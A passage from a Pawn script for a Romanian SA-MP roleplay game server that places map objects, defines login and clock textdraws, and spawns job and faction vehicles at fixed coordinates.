	CreateDynamicObject(955, 2273.52612, 2429.61206, 10.21940, 0.00000, 0.00000, 0.00000,-1,-1,-1,300.0); //usa
	CreateDynamicObject(1967, 2294.09497, 2494.32983, 3.40540, 0.00000, 0.00000, -4.68000,-1,-1,-1,300.0); //dozatorul
	CreateDynamicObject(19313, 2251.27319, 2498.03394, 5.56540,   0.00000, 0.00000, -90.36000,-1,-1,-1,300.0); //gratii

    //Lspd Object
	CreateDynamicObject(1500,1582.6122, -1637.9562, 12.3776,0.000000,0.000000,0.000000,-1,-1,-1,300.0);
    CreateDynamicObject(983, 1545.0706787109, -1635.6511230469, 13.237774848938, 0, 0, 0,-1,-1,-1,300.0);
    CreateDynamicObject(983, 1544.4979248047, -1620.7434082031, 13.238116264343, 0, 0, 0,-1,-1,-1,300.0);
    lspdbar = CreateDynamicObject(968, 1544.7007, -1630.7527, 13.2983, 0.0000, 90.0200, 90.0000,-1,-1,-1,300.0);

    //Lvpd Object
    lvpdbar = CreateDynamicObject(968, 2238.22021, 2450.44312, 10.58781, 0.0000, 90.0200, 90.0000,-1,-1,-1,300.0);

	//Garduri Fish
	CreateDynamicObject(970, 382.19919, -2042.00671, 7.32180,   0.00000, 0.00000, 0.00000,-1,-1,-1,500.0);
	CreateDynamicObject(970, 378.70398, -2045.08789, 7.32180,   0.00000, 0.00000, -91.98001,-1,-1,-1,500.0);
	CreateDynamicObject(970, 378.51715, -2050.44434, 7.32180,   0.00000, 0.00000, -92.76000,-1,-1,-1,500.0);
	CreateDynamicObject(970, 352.48499, -2050.70313, 7.29520, 0.00000, 0.00000, 0.00000,-1,-1,-1,500.0);
	//FBI DOZATOR
    CreateObject(955, 650.36047, -609.29718, 15.69630,   0.00000, 0.00000, 172.56000); //dozator

	//===============DMV /EXAM==========
	CreateObject(5837,391.0109,-1525.2551,31.9959,0.0000000,0.0000000,43.0640); //object(ci_guardhouse1) (1)
	return 1;
}
stock LoadTextdraws()
{
	/*LoginTD[0] = TextDrawCreate(-13.500000, -13.000000, "LD_SPAC:white");
	TextDrawLetterSize(LoginTD[0], 0.000000, 0.000000);
	TextDrawTextSize(LoginTD[0], 705.000000, 164.000000);
	TextDrawAlignment(LoginTD[0], 1);
	TextDrawColor(LoginTD[0], 252645375);
	TextDrawSetShadow(LoginTD[0], 0);
	TextDrawSetOutline(LoginTD[0], 0);
	TextDrawBackgroundColor(LoginTD[0], 255);
	TextDrawFont(LoginTD[0], 4);
	TextDrawSetProportional(LoginTD[0], 0);
	TextDrawSetShadow(LoginTD[0], 0);

	LoginTD[1] = TextDrawCreate(376.500000, 57.875000, "BLUE~W~GAME");
	TextDrawLetterSize(LoginTD[1], 0.673999, 2.142499);
	TextDrawAlignment(LoginTD[1], 3);
	TextDrawColor(LoginTD[1], 1010614015);
	TextDrawSetShadow(LoginTD[1], 0);
	TextDrawSetOutline(LoginTD[1], 0);
	TextDrawBackgroundColor(LoginTD[1], 255);
	TextDrawFont(LoginTD[1], 2);
	TextDrawSetProportional(LoginTD[1], 1);
	TextDrawSetShadow(LoginTD[1], 0);

	LoginTD[2] = TextDrawCreate(341.500000, 83.037483, "wwww.Magic-Gaming.tk");
	TextDrawLetterSize(LoginTD[2], 0.282999, 1.127501);
	TextDrawAlignment(LoginTD[2], 3);
	TextDrawColor(LoginTD[2], -1);
	TextDrawSetShadow(LoginTD[2], 0);
	TextDrawSetOutline(LoginTD[2], 0);
	TextDrawBackgroundColor(LoginTD[2], 255);
	TextDrawFont(LoginTD[2], 1);
	TextDrawSetProportional(LoginTD[2], 1);
	TextDrawSetShadow(LoginTD[2], 0);

	LoginTD[3] = TextDrawCreate(391.000000, 74.937500, "Next generation of gaming!");
	TextDrawLetterSize(LoginTD[3], 0.282999, 1.127501);
	TextDrawAlignment(LoginTD[3], 3);
	TextDrawColor(LoginTD[3], -1);
	TextDrawSetShadow(LoginTD[3], 0);
	TextDrawSetOutline(LoginTD[3], 0);
	TextDrawBackgroundColor(LoginTD[3], 255);
	TextDrawFont(LoginTD[3], 2);
	TextDrawSetProportional(LoginTD[3], 1);
	TextDrawSetShadow(LoginTD[3], 0);

	LoginTD[4] = TextDrawCreate(-33.000000, 273.562500, "LD_SPAC:white");
	TextDrawLetterSize(LoginTD[4], 0.000000, 0.000000);
	TextDrawTextSize(LoginTD[4], 706.000000, 183.000000);
	TextDrawAlignment(LoginTD[4], 1);
	TextDrawColor(LoginTD[4], 252645375);
	TextDrawSetShadow(LoginTD[4], 0);
	TextDrawSetOutline(LoginTD[4], 0);
	TextDrawBackgroundColor(LoginTD[4], 255);
	TextDrawFont(LoginTD[4], 4);
	TextDrawSetProportional(LoginTD[4], 0);
	TextDrawSetShadow(LoginTD[4], 0);

	LoginTD[5] = TextDrawCreate(-15.500000, 289.312500, "");
	TextDrawLetterSize(LoginTD[5], 0.000000, 0.000000);
	TextDrawTextSize(LoginTD[5], 148.000000, 104.000000);
	TextDrawAlignment(LoginTD[5], 1);
	TextDrawColor(LoginTD[5], -1);
	TextDrawSetShadow(LoginTD[5], 0);
	TextDrawSetOutline(LoginTD[5], 0);
	TextDrawBackgroundColor(LoginTD[5], 0);
	TextDrawFont(LoginTD[5], 5);
	TextDrawSetProportional(LoginTD[5], 0);
	TextDrawSetShadow(LoginTD[5], 0);
	TextDrawSetPreviewModel(LoginTD[5], 171);
	TextDrawSetPreviewRot(LoginTD[5], 0.000000, 0.000000, 20.000000, 1.000000);

	LoginTD[6] = TextDrawCreate(83.800140, 284.674957, "(RW)~w~Robi");
	TextDrawLetterSize(LoginTD[6], 0.226999, 1.088124);
	TextDrawAlignment(LoginTD[6], 3);
	TextDrawColor(LoginTD[6], 505321215);
	TextDrawSetShadow(LoginTD[6], 0);
	TextDrawSetOutline(LoginTD[6], 0);
	TextDrawBackgroundColor(LoginTD[6], 255);
	TextDrawFont(LoginTD[6], 2);
	TextDrawSetProportional(LoginTD[6], 1);
	TextDrawSetShadow(LoginTD[6], 0);

	LoginTD[7] = TextDrawCreate(104.000000, 388.725006, "CREEAREA ~W~UNUI SISTEM,______~N~NECESITA TIMP SI CUNOSTINTE.");
	TextDrawLetterSize(LoginTD[7], 0.146000, 1.096874);
	TextDrawAlignment(LoginTD[7], 3);
	TextDrawColor(LoginTD[7], 505321215);
	TextDrawSetShadow(LoginTD[7], 0);
	TextDrawSetOutline(LoginTD[7], 0);
	TextDrawBackgroundColor(LoginTD[7], 255);
	TextDrawFont(LoginTD[7], 2);
	TextDrawSetProportional(LoginTD[7], 1);
	TextDrawSetShadow(LoginTD[7], 0);

	LoginTD[8] = TextDrawCreate(189.000000, 286.687500, "");
	TextDrawLetterSize(LoginTD[8], 0.000000, 0.000000);
	TextDrawTextSize(LoginTD[8], 148.000000, 104.000000);
	TextDrawAlignment(LoginTD[8], 1);
	TextDrawColor(LoginTD[8], -1);
	TextDrawSetShadow(LoginTD[8], 0);
	TextDrawSetOutline(LoginTD[8], 0);
	TextDrawBackgroundColor(LoginTD[8], 0);
	TextDrawFont(LoginTD[8], 5);
	TextDrawSetProportional(LoginTD[8], 0);
	TextDrawSetShadow(LoginTD[8], 0);
	TextDrawSetPreviewModel(LoginTD[8], 3);
	TextDrawSetPreviewRot(LoginTD[8], 0.000000, 0.000000, 20.000000, 1.000000);

	LoginTD[9] = TextDrawCreate(303.000000, 282.312500, "Stefan~w~Vasquez");
	TextDrawLetterSize(LoginTD[9], 0.222999, 1.140624);
	TextDrawAlignment(LoginTD[9], 3);
	TextDrawColor(LoginTD[9], 505321215);
	TextDrawSetShadow(LoginTD[9], 0);
	TextDrawSetOutline(LoginTD[9], 0);
	TextDrawBackgroundColor(LoginTD[9], 255);
	TextDrawFont(LoginTD[9], 2);
	TextDrawSetProportional(LoginTD[9], 1);
	TextDrawSetShadow(LoginTD[9], 0);

	LoginTD[10] = TextDrawCreate(353.000000, 386.875000, "Administrarea~w~ unui server nu este deloc usoara,~n~dar incerc sa o fac cat mai bine,______________________________");
	TextDrawLetterSize(LoginTD[10], 0.146000, 1.096874);
	TextDrawAlignment(LoginTD[10], 3);
	TextDrawColor(LoginTD[10], 505321215);
	TextDrawSetShadow(LoginTD[10], 0);
	TextDrawSetOutline(LoginTD[10], 0);
	TextDrawBackgroundColor(LoginTD[10], 255);
	TextDrawFont(LoginTD[10], 2);
	TextDrawSetProportional(LoginTD[10], 1);
	TextDrawSetShadow(LoginTD[10], 0);

	LoginTD[11] = TextDrawCreate(351.199829, 396.800018, "deoarece vreau~n~ca toti jucatori sa fie mandrii de acest server!");
	TextDrawLetterSize(LoginTD[11], 0.146000, 1.096874);
	TextDrawAlignment(LoginTD[11], 3);
	TextDrawColor(LoginTD[11], -1);
	TextDrawSetShadow(LoginTD[11], 0);
	TextDrawSetOutline(LoginTD[11], 0);
	TextDrawBackgroundColor(LoginTD[11], 255);
	TextDrawFont(LoginTD[11], 2);
	TextDrawSetProportional(LoginTD[11], 1);
	TextDrawSetShadow(LoginTD[11], 0);

	LoginTD[12] = TextDrawCreate(157.000000, 398.687500, "dar mai devreme~n~sau mai tarziu,acestea tii vor aduce succesul.");
	TextDrawLetterSize(LoginTD[12], 0.146000, 1.096874);
	TextDrawAlignment(LoginTD[12], 3);
	TextDrawColor(LoginTD[12], -1);
	TextDrawSetShadow(LoginTD[12], 0);
	TextDrawSetOutline(LoginTD[12], 0);
	TextDrawBackgroundColor(LoginTD[12], 255);
	TextDrawFont(LoginTD[12], 2);
	TextDrawSetProportional(LoginTD[12], 1);
	TextDrawSetShadow(LoginTD[12], 0);

	LoginTD[13] = TextDrawCreate(377.500000, 281.875000, "");
	TextDrawLetterSize(LoginTD[13], 0.000000, 0.000000);
	TextDrawTextSize(LoginTD[13], 148.000000, 104.000000);
	TextDrawAlignment(LoginTD[13], 1);
	TextDrawColor(LoginTD[13], -1);
	TextDrawSetShadow(LoginTD[13], 0);
	TextDrawSetOutline(LoginTD[13], 0);
	TextDrawBackgroundColor(LoginTD[13], 0);
	TextDrawFont(LoginTD[13], 5);
	TextDrawSetProportional(LoginTD[13], 0);
	TextDrawSetShadow(LoginTD[13], 0);
	TextDrawSetPreviewModel(LoginTD[13], 208);
	TextDrawSetPreviewRot(LoginTD[13], 0.000000, 0.000000, 20.000000, 1.000000);

	LoginTD[14] = TextDrawCreate(445.000000, 280.562500, "");
	TextDrawLetterSize(LoginTD[14], 0.000000, 0.000000);
	TextDrawTextSize(LoginTD[14], 148.000000, 104.000000);
	TextDrawAlignment(LoginTD[14], 1);
	TextDrawColor(LoginTD[14], -1);
	TextDrawSetShadow(LoginTD[14], 0);
	TextDrawSetOutline(LoginTD[14], 0);
	TextDrawBackgroundColor(LoginTD[14], 0);
	TextDrawFont(LoginTD[14], 5);
	TextDrawSetProportional(LoginTD[14], 0);
	TextDrawSetShadow(LoginTD[14], 0);
	TextDrawSetPreviewModel(LoginTD[14], 46);
	TextDrawSetPreviewRot(LoginTD[14], 0.000000, 0.000000, 20.000000, 1.000000);

	LoginTD[15] = TextDrawCreate(487.500000, 277.937500, "(RW)~W~Ronholl.");
	TextDrawLetterSize(LoginTD[15], 0.222999, 1.140624);
	TextDrawAlignment(LoginTD[15], 3);
	TextDrawColor(LoginTD[15], 505321215);
	TextDrawSetShadow(LoginTD[15], 0);
	TextDrawSetOutline(LoginTD[15], 0);
	TextDrawBackgroundColor(LoginTD[15], 255);
	TextDrawFont(LoginTD[15], 2);
	TextDrawSetProportional(LoginTD[15], 1);
	TextDrawSetShadow(LoginTD[15], 0);

	LoginTD[16] = TextDrawCreate(544.500000, 277.937500, "Max~w~ymuss");
	TextDrawLetterSize(LoginTD[16], 0.222999, 1.140624);
	TextDrawAlignment(LoginTD[16], 3);
	TextDrawColor(LoginTD[16], 505321215);
	TextDrawSetShadow(LoginTD[16], 0);
	TextDrawSetOutline(LoginTD[16], 0);
	TextDrawBackgroundColor(LoginTD[16], 255);
	TextDrawFont(LoginTD[16], 2);
	TextDrawSetProportional(LoginTD[16], 1);
	TextDrawSetShadow(LoginTD[16], 0);

	LoginTD[17] = TextDrawCreate(534.500000, 379.875000, "SPONSORIZAREA~W~ UNUI SERVER,~N~ESTE CA O PETRECERE,______~N~INVESTESTI SI TE DISTREZI.___");
	TextDrawLetterSize(LoginTD[17], 0.146000, 1.096874);
	TextDrawAlignment(LoginTD[17], 3);
	TextDrawColor(LoginTD[17], 505321215);
	TextDrawSetShadow(LoginTD[17], 0);
	TextDrawSetOutline(LoginTD[17], 0);
	TextDrawBackgroundColor(LoginTD[17], 255);
	TextDrawFont(LoginTD[17], 2);
	TextDrawSetProportional(LoginTD[17], 1);
	TextDrawSetShadow(LoginTD[17], 0);*/

    Time = TextDrawCreate(552.500000, 28.437500, "21:00");
	TextDrawLetterSize(Time, 0.457499, 1.556250);
	TextDrawAlignment(Time, 1);
	TextDrawColor(Time, -1);
	TextDrawSetShadow(Time, 0);
	TextDrawSetOutline(Time, 1);
	TextDrawBackgroundColor(Time, 255);
	TextDrawFont(Time, 2);
	TextDrawSetProportional(Time, 1);

	Date = TextDrawCreate(550.500000, 42.000000, "31.05.2016");
	TextDrawLetterSize(Date, 0.252499, 0.746874);
	TextDrawAlignment(Date, 1);
	TextDrawColor(Date, -1);
	TextDrawSetShadow(Date, 0);
	TextDrawSetOutline(Date, 1);
	TextDrawBackgroundColor(Date, 51);
	TextDrawFont(Date, 2);
	TextDrawSetProportional(Date, 1);

	Logosv1 = TextDrawCreate(614.500000, 427.562500, "TOP~W~ZONE");
	TextDrawLetterSize(Logosv1, 0.468499, 1.639374);
	TextDrawAlignment(Logosv1, 3);
	TextDrawColor(Logosv1, 423728895);
	TextDrawSetShadow(Logosv1, 0);
	TextDrawSetOutline(Logosv1, 0);
	TextDrawBackgroundColor(Logosv1, 255);
	TextDrawFont(Logosv1, 1);
	TextDrawSetProportional(Logosv1, 1);
	TextDrawSetShadow(Logosv1, 0);

	Logosv2 = TextDrawCreate(630.299926, 440.350006, "NEXT GENERATION OF GAMING!");
	TextDrawLetterSize(Logosv2, 0.221000, 0.606873);
	TextDrawAlignment(Logosv2, 3);
	TextDrawColor(Logosv2, -1);
	TextDrawSetShadow(Logosv2, 0);
	TextDrawSetOutline(Logosv2, 0);
	TextDrawBackgroundColor(Logosv2, 255);
	TextDrawFont(Logosv2, 1);
	TextDrawSetProportional(Logosv2, 1);
	TextDrawSetShadow(Logosv2, 0);
	return 1;
}

public OnLoadAllCars()
{
    // TOW CAR
	towcar[1] = AddStaticVehicleEx(525,901.3007, -1206.4827, 16.8443, -180.6000,1,1,300);
	towcar[2] = AddStaticVehicleEx(525,867.2260, -1207.3051, 16.8443, -179.9400,1,1,300);
	towcar[3] = AddStaticVehicleEx(525,831.0751, -1207.0022, 16.8443, -180.6000,1,1,300);
	towcar[4] = AddStaticVehicleEx(525,865.9183, -1245.2936, 14.9243, -89.1600,1,1,300);
	towcar[5] = AddStaticVehicleEx(525,865.2650, -1255.1388, 14.9243, -89.1600,1,1,300);
	towo1 = CreateObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
    towo2 = CreateObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
    AttachObjectToVehicle(towo1, towcar[1], -0.600000,-0.485000,1.450000,0.000000,0.000000,0.000000);
    AttachObjectToVehicle(towo2, towcar[1], 0.600000,-0.485000,1.450000,0.000000,0.000000,0.000000);
    towo1b = CreateObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
    towo2b = CreateObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
    AttachObjectToVehicle(towo1b, towcar[2], -0.600000,-0.485000,1.450000,0.000000,0.000000,0.000000);
    AttachObjectToVehicle(towo2b, towcar[2], 0.600000,-0.485000,1.450000,0.000000,0.000000,0.000000);
    towo1c = CreateObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
    towo2c = CreateObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
    AttachObjectToVehicle(towo1c, towcar[3], -0.600000,-0.485000,1.450000,0.000000,0.000000,0.000000);
    AttachObjectToVehicle(towo2c, towcar[3], 0.600000,-0.485000,1.450000,0.000000,0.000000,0.000000);
    towo1d = CreateObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
    towo2d = CreateObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
    AttachObjectToVehicle(towo1d, towcar[4], -0.600000,-0.485000,1.450000,0.000000,0.000000,0.000000);
    AttachObjectToVehicle(towo2d, towcar[4], 0.600000,-0.485000,1.450000,0.000000,0.000000,0.000000);
    towo1e = CreateObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
    towo2e = CreateObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
    AttachObjectToVehicle(towo1e, towcar[5], -0.600000,-0.485000,1.450000,0.000000,0.000000,0.000000);
    AttachObjectToVehicle(towo2e, towcar[5], 0.600000,-0.485000,1.450000,0.000000,0.000000,0.000000);

    // PARAMEDIC

     ambcars[1] = AddStaticVehicleEx(416, 1178.0112, -1337.5996, 13.9883, -92.9400, -1, -1, 100);
	ambcars[2] = AddStaticVehicleEx(416, 1178.3800, -1309.0660, 13.9883, -92.9400, -1, -1, 100);
	ambcars[3] = AddStaticVehicleEx(522, 1182.6345, -1317.2422, 13.0967, -88.2000, -1, -1, 100);
	ambcars[4] = AddStaticVehicleEx(522, 1182.8975, -1331.0564, 13.0967, -88.2000, -1, -1, 100);
	ambcars[5] = AddStaticVehicleEx(416, 1145.5447, -1295.8604, 13.7841, 90.4800, -1, -1, 100);
	ambcars[6] = AddStaticVehicleEx(416, 1145.6697, -1315.5721, 13.7841, 90.4800, -1, -1, 100);
	ambcars[7] = AddStaticVehicleEx(416, 1145.6697, -1309.4496, 13.7841, 90.4800, -1, -1, 100);
	ambcars[8] = AddStaticVehicleEx(416, 1145.6697, -1302.5037, 13.7841, 90.4800, -1, -1, 100);
	ambcars[9] = AddStaticVehicleEx(563, 1166.7379, -1358.0651, 30.4401, -85.2600, -1, -1, 100);
	ambcars[10] = AddStaticVehicleEx(563, 1166.7379, -1374.5994, 30.4401, -85.2600, -1, -1, 100);
	ambcars[11] = AddStaticVehicleEx(407, 1123.4706, -1326.1268, 13.8914, 0.0000, -1, -1, 100);
	ambcars[12] = AddStaticVehicleEx(544, 1111.1136, -1326.1268, 14.8517, 0.0000, -1, -1, 100);
	ambcars[13] = AddStaticVehicleEx(496, 1142.0826, -1330.7932, 13.2680, 87.3000, -1, -1, 100);
	ambcars[14] = AddStaticVehicleEx(496, 1142.1400, -1322.1779, 13.2680, 87.3000, -1, -1, 100);
	ambcars[15] = AddStaticVehicleEx(496, 1142.1400, -1326.3901, 13.2680, 87.3000, -1, -1, 100);
	ambcars[16] = AddStaticVehicleEx(522, 1133.9858, -1311.9971, 13.0060, -92.3400, -1, -1, 100);
	ambcars[17] = AddStaticVehicleEx(522, 1133.9858, -1303.0812, 13.0060, -92.3400, -1, -1, 100);
	ambcars[18] = AddStaticVehicleEx(522, 1133.9858, -1305.9606, 13.0060, -92.3400, -1, -1, 100);
	ambcars[19] = AddStaticVehicleEx(522, 1133.9858, -1308.7845, 13.0060, -92.3400, -1, -1, 100);
	// NR
	news[1] = AddStaticVehicleEx(429, 782.6394, -1333.2651, 13.0807, -275.6400, -1, -1, 100);
	news[2] = AddStaticVehicleEx(429, 782.3864, -1337.1594, 13.0807, -275.6400, -1, -1, 100);
	news[3] = AddStaticVehicleEx(451, 781.8766, -1346.0446, 13.0831, -275.6400, -1, -1, 100);
	news[4] = AddStaticVehicleEx(451, 782.1517, -1341.3472, 13.0831, -275.6400, -1, -1, 100);
	news[5] = AddStaticVehicleEx(409, 783.6517, -1360.3496, 13.1850, 0.0000, -1, -1, 100);
	news[6] = AddStaticVehicleEx(409, 784.0592, -1379.6639, 13.1850, 0.0000, -1, -1, 100);
	news[7] = AddStaticVehicleEx(409, 784.1094, -1369.6503, 13.1850, 0.0000, -1, -1, 100);
	news[8] = AddStaticVehicleEx(582, 758.1061, -1360.4294, 13.5676, -84.0000, -1, -1, 100);
	news[9] = AddStaticVehicleEx(582, 758.6708, -1379.7350, 13.5676, -84.0000, -1, -1, 100);
	news[10] = AddStaticVehicleEx(582, 758.6776, -1375.1968, 13.5676, -84.0000, -1, -1, 100);
	news[11] = AddStaticVehicleEx(582, 758.4971, -1370.1798, 13.5676, -84.0000, -1, -1, 100);
	news[12] = AddStaticVehicleEx(582, 758.1224, -1365.2094, 13.5676, -84.0000, -1, -1, 100);
	news[13] = AddStaticVehicleEx(488, 741.1589, -1352.0212, 13.6307, -93.0000, -1, -1, 100);
	news[14] = AddStaticVehicleEx(488, 755.8831, -1351.8672, 13.6307, -93.0000, -1, -1, 100);
	news[15] = AddStaticVehicleEx(488, 755.4133, -1338.2217, 13.6307, -93.0000, -1, -1, 100);
	news[16] = AddStaticVehicleEx(488, 742.0925, -1337.8103, 13.6307, -93.0000, -1, -1, 100);
	CreateObject(3934, 756.18756, -1351.69336, 12.52720,   0.00000, 0.00000, 0.00000);
	CreateObject(3934, 741.97943, -1351.98499, 12.52720,   0.00000, 0.00000, 0.00000);
	CreateObject(3934, 742.70013, -1337.99951, 12.52720,   0.00000, 0.00000, 0.00000);
	CreateObject(3934, 756.48615, -1338.19080, 12.52720,   0.00000, 0.00000, 0.00000);

	// TAXI CAR
	taxic[1] = AddStaticVehicleEx(438, 1777.8962, -1928.7753, 13.2539, -89.2200, 1, 1, 900);
	taxic[2] = AddStaticVehicleEx(438, 1777.9846, -1924.8000, 13.2539, -89.2200, 1, 1, 900);
	taxic[3] = AddStaticVehicleEx(438, 1777.9037, -1920.9972, 13.2539, -89.2200, 1, 1, 900);
	taxic[4] = AddStaticVehicleEx(438, 1777.9978, -1917.2262, 13.2539, -89.2200, 1, 1, 900);
	taxic[5] = AddStaticVehicleEx(438, 1777.9723, -1913.4618, 13.2539, -89.2200, 1, 1, 900);
	taxic[6] = AddStaticVehicleEx(560, 1803.1727, -1932.4276, 13.0398, -1.2600, 1, 1, 900);
	taxic[7] = AddStaticVehicleEx(560, 1799.4490, -1932.5117, 13.0398, -1.2600, 1, 1, 900);
	taxic[8] = AddStaticVehicleEx(426, 1795.7461, -1932.5288, 13.0398, -1.2600, 1, 1, 900);
	taxic[9] = AddStaticVehicleEx(426, 1792.0023, -1932.5956, 13.0398, -1.2600, 1, 1, 900);
	taxic[10] = AddStaticVehicleEx(426, 1788.0906, -1932.5337, 13.0398, -1.2600, 1, 1, 900);
	for(new y = 6; y <= 10;y++)
	{
		new taxiobj = CreateObject(19308, 0.00000, 0.00000, 0.00000,0.00000, 0.00000, 0.00000);
		AttachObjectToVehicle(taxiobj, taxic[y], 0.000000, -0.249999, 0.949999, 0.000000, 0.000001, 90.449951); //Object taxi
	}

	// BUS
    //bus[1] = AddStaticVehicleEx(431,1650.1229,-2259.2463,13.5470,90.3719,-1,-1,300);
    //bus[2] = AddStaticVehicleEx(431,1635.9896,-2259.3188,13.5358,88.9193,-1,-1,300);
    //bus[3] = AddStaticVehicleEx(431,1622.1984,-2259.0908,13.5464,88.9671,-1,-1,300);
    //bus[4] = AddStaticVehicleEx(431,1607.0907,-2258.9580,13.5663,89.2480,-1,-1,300);
    //bus[5] = AddStaticVehicleEx(431,1593.3704,-2258.8799,13.5860,89.0953,-1,-1,300);
    //bus[6] = AddStaticVehicleEx(431,1633.5763,-2248.2219,13.5406,268.2228,-1,-1,300);
    //bus[7] = AddStaticVehicleEx(431,1593.8784,-2248.1543,13.5825,269.2748,-1,-1,300);
    //bus[8] = AddStaticVehicleEx(431,1577.4076,-2215.0125,13.6680,358.6657,-1,-1,300);
    //bus[9] = AddStaticVehicleEx(431,1584.6625,-2215.5178,13.6981,357.9202,-1,-1,300);
    bus[10] = AddStaticVehicleEx(431,1596.5707,-2158.0359,13.6880,179.3022,-1,-1,300);
    bus[11] = AddStaticVehicleEx(431,1590.8229,-2157.8784,13.6881,179.4117,-1,-1,300);
    bus[12] = AddStaticVehicleEx(431,1602.0060,-2158.1663,13.6880,180.0125,-1,-1,300);
    bus[13] = AddStaticVehicleEx(431,1607.7881,-2158.3040,13.6880,178.7068,-1,-1,300);
    bus[14] = AddStaticVehicleEx(431,1613.4357,-2158.4617,13.6883,178.5858,-1,-1,300);
    bus[15] = AddStaticVehicleEx(431,1618.9712,-2158.6409,13.6880,177.4767,-1,-1,300);
    bus[16] = AddStaticVehicleEx(431,1624.0460,-2158.9631,13.6882,177.5360,-1,-1,300);

    /*// PIZZA SCOOTER
	pizza[1] = AddStaticVehicleEx(448,2121.6047, -1785.0217, 12.8712, 0.0000,-1,-1,300);
	pizza[2] = AddStaticVehicleEx(448,2118.7844, -1785.0411, 12.8712, 0.0000,-1,-1,300);
	pizza[3] = AddStaticVehicleEx(448,2115.9109, -1785.0051, 12.8712, 0.0000,-1,-1,300);
	pizza[4] = AddStaticVehicleEx(448,2112.5642, -1784.9452, 12.8712, 0.0000,-1,-1,300);
	pizza[5] = AddStaticVehicleEx(448,2109.4675, -1784.8478, 12.8712, 0.0000,-1,-1,300);
	pizza[6] = AddStaticVehicleEx(448,2106.0376, -1784.9371, 12.8712, 0.0000,-1,-1,300);
	pizza[7] = AddStaticVehicleEx(448,2102.1960, -1784.8618, 12.8712, 0.0000,-1,-1,300);
	pizza[8] = AddStaticVehicleEx(448,2122.4009, -1780.5249, 12.8712, 90.3000,-1,-1,300);
	pizza[9] = AddStaticVehicleEx(448,2092.4058, -1812.4491, 12.8712, 90.3000,-1,-1,300);
	pizza[10] = AddStaticVehicleEx(448,2092.4268, -1814.1829, 12.8712, 90.3000,-1,-1,300);
	pizza[11] = AddStaticVehicleEx(448,2092.3889, -1815.8123, 12.8712, 90.3000,-1,-1,300);
	pizza[12] = AddStaticVehicleEx(448,2092.4170, -1817.3027, 12.8712, 90.3000,-1,-1,300);
	pizza[13] = AddStaticVehicleEx(448,2092.4138, -1819.1460, 12.8712, 90.3000,-1,-1,300);
	pizza[14] = AddStaticVehicleEx(448,2092.4617, -1820.7538, 12.8712, 90.3000,-1,-1,300);*/

	// FARMER
	farm[1] = AddStaticVehicleEx(531,-387.1538,-1453.2056,25.6913,181.7959,-1,-1,300);
	farm[2] = AddStaticVehicleEx(531,-390.8254,-1453.0826,25.6916,180.5099,-1,-1,300);
	farm[3] = AddStaticVehicleEx(531,-374.0725,-1425.5186,25.6929,91.8350,-1,-1,300);
	farm[5] = AddStaticVehicleEx(531,-374.0028,-1422.2795,25.6906,90.3433,-1,-1,300);
	farm[6] = AddStaticVehicleEx(531,-374.0585,-1419.3248,25.6898,92.3791,-1,-1,300);
	farm[7] = AddStaticVehicleEx(531,-374.1625,-1417.1273,25.6926,92.3748,-1,-1,300);
	farm[8] = AddStaticVehicleEx(531,-382.3956,-1413.8763,25.6903,269.2228,-1,-1,300);
	farm[9] = AddStaticVehicleEx(531,-382.1954,-1417.5774,25.6906,267.3361,-1,-1,300);
	farm[10] = AddStaticVehicleEx(531,-363.6213,-1437.9761,25.6929,173.9550,-1,-1,300);
	farm[11] = AddStaticVehicleEx(531,-366.1567,-1437.9288,25.6901,178.3990,-1,-1,300);
	farm[12] = AddStaticVehicleEx(531,-369.0606,-1437.7853,25.6897,179.9403,-1,-1,300);
	farm[13] = AddStaticVehicleEx(531,-372.1531,-1437.8651,25.6910,179.5404,-1,-1,300);

	// TRUCK
	truck[1] = AddStaticVehicleEx(515,-72.8603,-1109.0897,2.0963,160.0689,-1,-1,300);
	truck[2] = AddStaticVehicleEx(515,-77.6478,-1107.6663,2.1010,162.3327,-1,-1,300);
	truck[3] = AddStaticVehicleEx(515,-68.3563,-1110.6467,2.0967,159.2912,-1,-1,300);
	truck[4] = AddStaticVehicleEx(515,-64.2460,-1112.1866,2.0938,159.8777,-1,-1,300);
	truck[5] = AddStaticVehicleEx(515,-59.7920,-1113.6851,2.1026,160.2900,-1,-1,300);
	truck[6] = AddStaticVehicleEx(515,-55.5603,-1115.3163,2.0942,157.6068,-1,-1,300);
	truck[7] = AddStaticVehicleEx(515,-51.5216,-1116.9735,2.0941,158.3461,-1,-1,300);
	truck[8] = AddStaticVehicleEx(515,-47.4731,-1118.4883,2.0954,158.2615,-1,-1,300);
	truck[9] = AddStaticVehicleEx(515,-43.2673,-1120.0728,2.0987,159.5139,-1,-1,300);
	truck[10] = AddStaticVehicleEx(515,-38.9120,-1121.6001,2.1011,158.6831,-1,-1,300);
	truck[11] = AddStaticVehicleEx(515,-34.7402,-1123.2100,2.0965,158.0090,-1,-1,300);
	truck[12] = AddStaticVehicleEx(515,-30.4689,-1124.9196,2.0988,158.5070,-1,-1,300);
	truck[13] = AddStaticVehicleEx(515,-64.8522,-1142.4553,2.1026,337.1617,-1,-1,300);
	truck[14] = AddStaticVehicleEx(515,-60.4594,-1144.4293,2.0990,337.4590,-1,-1,300);
	truck[15] = AddStaticVehicleEx(515,-55.9892,-1146.2482,2.1009,337.4587,-1,-1,300);
	truck[16] = AddStaticVehicleEx(515,-51.4604,-1148.1526,2.1010,337.6587,-1,-1,300);
	truck[17] = AddStaticVehicleEx(515,-46.7572,-1150.0371,2.0950,338.6752,-1,-1,300);
	truck[18] = AddStaticVehicleEx(515,-41.8993,-1151.7046,2.0943,339.3744,-1,-1,300);

	// RENT LOS SANTOS
	rentls[1] = AddStaticVehicleEx(480,527.3317,-1290.7275,17.0334,2.3469,-1,-1,900);
	rentls[2] = AddStaticVehicleEx(589,531.8309,-1290.7037,16.8775,359.8583,-1,-1,900);
	rentls[3] = AddStaticVehicleEx(603,536.9099,-1291.3887,16.9950,358.4290,-1,-1,900);
